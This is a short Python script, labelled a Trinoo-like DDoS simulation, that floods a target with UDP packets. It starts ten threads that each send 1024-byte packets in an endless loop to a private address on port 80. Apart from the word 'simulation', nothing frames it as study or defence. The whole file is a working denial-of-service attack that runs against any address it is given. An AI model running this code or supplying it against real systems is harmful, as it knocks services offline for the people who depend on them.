# Trinoo-like DDoS simulation (simplified)
import socket
import threading

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b'A' * 1024
    while True:
        sock.sendto(data, (target_ip, target_port))

if __name__ == '__main__':
    ip = '192.168.0.10'
    port = 80
    threads = []
    for i in range(10):
        t = threading.Thread(target=udp_flood, args=(ip, port))
        t.start()
        threads.append(t)
